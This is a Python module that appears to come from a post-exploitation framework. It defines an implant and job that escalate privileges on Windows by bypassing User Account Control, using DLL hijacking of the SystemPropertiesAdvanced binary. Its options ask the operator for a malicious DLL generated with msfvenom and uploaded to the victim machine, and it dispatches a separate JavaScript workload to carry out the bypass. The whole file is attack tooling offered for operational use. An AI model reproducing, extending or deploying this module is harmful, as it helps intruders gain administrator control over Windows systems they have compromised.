import core.job
import core.implant
import uuid

class SystemPropertiesAdvancedJob(core.job.Job):
    def create(self):
        id = self.options.get("PAYLOAD")
        payload = self.load_payload(id)
        self.options.set("PAYLOAD_DATA", payload)
        if self.session_id == -1:
            return

    def done(self):
        self.display()

    def display(self):
        self.results = "Completed"

class SystemPropertiesAdvancedImplant(core.implant.Implant):

    NAME = "Bypass UAC  SystemPropertiesAdvanced"
    DESCRIPTION = "UAC bypass through DLL Hijacking method (systempropertiesadvanced binary)"
    AUTHORS = ["@JosueEncinar"]
    STATE = "implant/elevate/bypassuac_systempropertiesadvanced"

    def load(self):
        self.options.register("PAYLOAD", "0", "No need to touch it, it is not used in this bypass")
        self.options.register("USER", "", "Current User")
        self.options.register("DLL", "", "Malicius DLL. First use msfvenom and upload it to Windows. Example: C:/Users/IEUser/Desktop/srrstr.dll")
        self.options.register("PAYLOAD_DATA", "", "the actual data", hidden=True)

    def job(self):
        return SystemPropertiesAdvancedJob

    def run(self):
        id = self.options.get("PAYLOAD")
        payload = self.load_payload(id)

        if payload is None:
            self.shell.print_error("Payload %s not found." % id)
            return

        workloads = {}
        workloads["js"] = "data/implant/elevate/bypassuac_systempropertiesadvanced.js"

        self.dispatch(workloads, self.job)
